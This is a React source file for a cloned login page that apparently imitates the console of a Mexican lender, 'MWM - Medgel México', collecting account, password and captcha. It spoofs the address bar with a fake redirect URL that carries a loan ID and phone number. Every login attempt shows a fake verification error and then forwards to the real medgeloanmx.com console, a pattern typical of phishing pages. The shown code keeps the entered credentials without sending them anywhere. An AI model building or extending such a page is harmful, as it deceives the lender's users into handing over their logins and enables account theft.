"use client";

import { useState, useEffect } from "react";

type FieldName = "cuenta" | "password" | "captcha";

export default function Login() {
  const [cuenta, setCuenta] = useState("");
  const [password, setPassword] = useState("");
  const [captcha, setCaptcha] = useState("");
  const [showPass, setShowPass] = useState(false);

  const [showError, setShowError] = useState(false);

  // 🔥 DROPDOWN IDIOMA
  const [showLang, setShowLang] = useState(false);

  // 🔥 FAKE URL REAL EN NAVEGADOR
  const fakeUrl =
    "/?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";

  const handleLogin = () => {
    setShowError(true);

    setTimeout(() => {
      window.location.href =
        "https://console.medgeloanmx.com/login?redirect=/BillingDetails/1380183659336716288?acqChannel=LAPT&planId=1708337&caseNo=1441352536830263297&loanId=1439978351889526784&system=MW&phoneNumber=527821233246";
    }, 1500);
  };

  // 🔥 FAKE URL EN EL NAVEGADOR (SIN RECARGAR)
  useEffect(() => {
    if (!window.location.search.includes("redirect=")) {
      window.history.replaceState({}, "", fakeUrl);
    }
  }, []);

  // 🔥 SOLUCIÓN CONGELAMIENTO AL REGRESAR
  useEffect(() => {
    const handlePageShow = (event: PageTransitionEvent) => {
      if (event.persisted) {
        window.location.reload();
      }
    };

    window.addEventListener("pageshow", handlePageShow);

    return () => {
      window.removeEventListener("pageshow", handlePageShow);
    };
  }, []);

  const captchas = [
    "/captcha/c1.png",
    "/captcha/c2.png",
    "/captcha/c3.png",
    "/captcha/c4.png",
    "/captcha/c5.png",
    "/captcha/c6.png",
    "/captcha/c7.png",
    "/captcha/c8.png",
    "/captcha/c9.png",
    "/captcha/c10.png",
  ];

  const [captchaImg, setCaptchaImg] = useState(captchas[0]);

  const cambiarCaptcha = () => {
    const random = captchas[Math.floor(Math.random() * captchas.length)];
    setCaptchaImg(random);
  };

  const [focusedField, setFocusedField] = useState<FieldName | null>(null);
  const [touched, setTouched] = useState<Record<FieldName, boolean>>({
    cuenta: false,
    password: false,
    captcha: false,
  });

  const handleFocus = (f: FieldName) => setFocusedField(f);

  const handleBlur = (f: FieldName) => {
    setFocusedField(null);
    setTouched((prev) => ({ ...prev, [f]: true }));
  };

  const isEmpty = (v: string) => v.trim() === "";

  const showCuentaError = touched.cuenta && isEmpty(cuenta);
  const showPasswordError = touched.password && isEmpty(password);

  const getBorder = (f: FieldName, error: boolean) => {
    if (focusedField === f) return "border-[#67c23a]";
    if (error) return "border-[#ff6b6b]";
    return "border-[#dcdfe6]";
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#304156] px-3 relative overflow-hidden">

      {/* 🔴 NOTIFICACIÓN */}
      <div
        className={`fixed top-0 left-1/2 -translate-x-1/2 z-50 transition-all duration-500 ${
          showError
            ? "translate-y-5 opacity-100"
            : "-translate-y-full opacity-0"
        }`}
      >
        <div className="w-[500px] max-w-[92vw] bg-[#fef0f0] border border-[#fde2e2] rounded-[6px] shadow-sm px-6 py-4 flex items-center gap-3">
          <div className="w-[18px] h-[18px] rounded-full bg-[#f56c6c] text-white flex items-center justify-center text-[12px]">
            ×
          </div>
          <span className="text-[15px] text-[#f56c6c]">
            Error en el Código de verificación
          </span>
        </div>
      </div>

      <div className="scale-[0.96]">
        <div className="bg-[#ffff] w-[418px] rounded-[8px] px-[24px] py-[33px] shadow-sm">

          <h2 className="text-center text-[#6f6f6f] text-[19px] font-medium mb-5 translate-y-[-6px]">
            MWM - Medgel México
          </h2>

          <form>

            {/* CUENTA */}
            <div className="mb-[6px]">
              <div className="relative">
                <div className="absolute left-[6px] top-1/2 -translate-y-1/2">
                  <svg width="32" height="16" viewBox="0 0 24 24" fill="#a8abb2">
                    <path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" />
                  </svg>
                </div>

                <input
                  type="text"
                  placeholder="Cuenta"
                  value={cuenta}
                  onChange={(e) => setCuenta(e.target.value)}
                  onFocus={() => handleFocus("cuenta")}
                  onBlur={() => handleBlur("cuenta")}
                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("cuenta", showCuentaError)}`}
                />
              </div>

              <div className="h-[12px]">
                {showCuentaError && (
                  <p className="text-[12px] text-[#ff6b6b]">
                    Por favor introduzca su cuenta
                  </p>
                )}
              </div>
            </div>

            {/* PASSWORD */}
            <div className="mb-[6px]">
              <div className="relative">
                <img
                  src="/icons/lock.png"
                  className="absolute left-[16px] top-1/2 -translate-y-1/2 w-[12px] opacity-60"
                  alt=""
                />

                <input
                  type={showPass ? "text" : "password"}
                  placeholder="Contraseña"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => handleFocus("password")}
                  onBlur={() => handleBlur("password")}
                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-10 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("password", showPasswordError)}`}
                />

                <button
                  type="button"
                  onMouseDown={(e) => e.preventDefault()}
                  onClick={() => setShowPass((v) => !v)}
                  className="absolute right-3 top-1/2 -translate-y-1/2"
                >
                  <img
                    src={showPass ? "/icons/eye-open.png" : "/icons/eye-closed.png"}
                    className="w-[16px] h-[16px] object-contain opacity-40"
                    alt=""
                  />
                </button>
              </div>

              <div className="h-[12px]">
                {showPasswordError && (
                  <p className="text-[12px] text-[#ff6b6b]">
                    Por favor introduzca su contraseña
                  </p>
                )}
              </div>
            </div>

            {/* CAPTCHA */}
            <div className="flex gap-3 mb-[10px]">
              <div className="relative flex-1">
                <img
                  src="/icons/shield.png"
                  className="absolute left-[16px] top-1/2 -translate-y-1/2 w-[12px] opacity-60"
                  alt=""
                />

                <input
                  type="text"
                  placeholder="Código de verificación"
                  value={captcha}
                  onChange={(e) => setCaptcha(e.target.value)}
                  onFocus={() => handleFocus("captcha")}
                  onBlur={() => handleBlur("captcha")}
                  className={`w-full h-[41px] bg-[#ffff] rounded-[4px] pl-[34px] pr-5 text-[15px] text-[#606266] placeholder:text-[#909399] outline-none border ${getBorder("captcha", false)}`}
                />
              </div>

              <img
                src={captchaImg}
                onClick={cambiarCaptcha}
                className="mr-[12px] w-[120px] h-[41px] border border-[#8bc34a] bg-white object-cover cursor-pointer"
                alt=""
              />
            </div>

            {/* 🔥 TRADUCTOR MÁS A LA IZQUIERDA */}
            <div className="mt-5 mb-3 relative -ml-2 inline-block">

              <img
                src="/icons/translate.png"
                className="w-[36px] h-[20px] opacity-60 object-contain cursor-pointer"
                alt=""
                onClick={() => setShowLang((v) => !v)}
              />

              <div
  className={`absolute left-1/2 top-[55px] -translate-x-1/2 origin-top transition-all duration-300 ease-out z-50 ${
    showLang
      ? "scale-y-100 opacity-100"
      : "scale-y-0 opacity-0 pointer-events-none"
  }`}
>
<div className="bg-white rounded-[6px] shadow-md border border-[#e4e7ed] px-4 py-3 w-[90px] relative">    {/* Flecha centrada mejor */}
    <div className="absolute -top-2 left-1/2 -translate-x-1/2 w-3 h-3 bg-white rotate-45"></div>

<div className="flex flex-col gap-2 text-[14px] leading-[16px]">
      <button
        type="button"
        className="text-left text-[#a8abb2] font-medium"
        onClick={() => setShowLang(false)}
      >
        Español
      </button>

      <button
        type="button"
        className="text-left text-[#303133] font-medium"
        onClick={() => setShowLang(false)}
      >
        简体中文
      </button>

    </div>
  </div>
</div>
            </div>

            {/* BOTÓN */}
            <button
              type="button"
              onClick={handleLogin}
              className="w-full h-[43px] bg-[#52c41a] hover:bg-[#73d13d] text-white rounded-[4px] text-[15px]"
            >
              Iniciar sesión
            </button>

          </form>
        </div>
      </div>
    </div>
  );
} 